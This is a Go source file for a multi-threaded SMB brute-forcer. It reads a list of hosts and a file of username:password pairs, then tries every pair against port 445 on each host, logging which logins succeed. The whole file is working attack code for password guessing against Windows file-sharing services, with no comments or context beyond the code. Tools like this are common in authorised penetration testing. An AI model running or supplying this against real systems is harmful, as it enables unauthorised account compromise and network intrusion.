package main

import (
	"log"
	"bufio"
	"sync"
	"os"
	"strings"
	"io"
	"github.com/stacktitan/smb/smb"
)

func parsehosts(file io.Reader) []string {
	var hostfile []string
	scanner := bufio.NewScanner(file)
	for i:=0; scanner.Scan();i++ {
		hostfile = append(hostfile,scanner.Text())
	}
	return hostfile
}

func parsecreds(file io.Reader) [][]string {
	var credentials [][]string
	scanner := bufio.NewScanner(file)
	for i:=0; scanner.Scan();i++ {
		credentials = append(credentials,strings.Split(scanner.Text(),":"))
	}
	return credentials
}

func Brute (options smb.Options, credentials [][]string) int {
	log.Println("bruting")
	for i:=0; i<len(credentials) ; i++{
		options.User=credentials[i][0]
		options.Password=credentials[i][1]
			debug := false
		session, err := smb.NewSession(options, debug)
		if err != nil {
			log.Println("[!] Login FAIL with user:", credentials[i][0],"and password: ",credentials[i][1])
		}
		if session.IsAuthenticated {
			log.Println("[+] Login SUCCESS  with user: ",credentials[i][0],"and password: ", credentials[i][1])
		}
		session.Close()
	}
	return 0
}

func oneHostBrute(options smb.Options, credentials [][]string, wg *sync.WaitGroup) int {
	Brute(options, credentials)
	wg.Done()
	return 0
}

func multiHostBrute(options smb.Options, hosts []string, credentials [][]string, wg *sync.WaitGroup) int {
	for i:=0; i<len(hosts);i++{
		options.Host=hosts[i]
		Brute(options, credentials)
	}
	wg.Done()
	return 0
}


func oneHostDispatcher (options smb.Options, credentials[][]string, threads int) int {
	var wg sync.WaitGroup
	for i:=1; i<(threads+1);i++{
		slicedcreds:=credentials[(i-1)*len(credentials)/threads:i*len(credentials)/threads]
		wg.Add(1)
		go oneHostBrute(options,slicedcreds,&wg)
		log.Println("after brute")
	}
	wg.Wait()
	return 0
}

func Dispatcher (options smb.Options, hosts []string, credentials [][]string, threads int) int {
	var wg sync.WaitGroup
	for i:=1; i<(threads+1);i++{
		slicedhosts:=hosts[(i-1)*len(hosts)/threads:i*len(hosts)/threads]
		wg.Add(1)
		go multiHostBrute(options,slicedhosts,credentials,&wg)
		log.Println("after brute")
	}
	wg.Wait()
	return 0
}

func main() {

	hostfilename := os.Args[1]
	credfilename := os.Args[2]

	credfile, err := os.Open(credfilename)
	if err != nil {
        log.Fatal(err)
	}
	defer credfile.Close()

	hostfile, err := os.Open(hostfilename)
	if err != nil {
		log.Fatal(err)
	}
	defer hostfile.Close()

	credentials := parsecreds(credfile) // credentials is an array of array looking like [username password]
	hosts := parsehosts(hostfile)

	// if only one host, thread the credential file
	if len(hosts) < 2 {
		options := smb.Options{
			Host:		hosts[0],
			Port:		445,
			User:		"",
			Domain:		"",
			Workstation:	"",
			Password:	"",
		}

		oneHostDispatcher(options, credentials,4)
	} else {
		options := smb.Options{
			Host:		"",
			Port:		445,
			User:		"",
			Domain:		"",
			Workstation:	"",
			Password:	"",
		}
		Dispatcher(options, hosts, credentials, 4)
	}
}

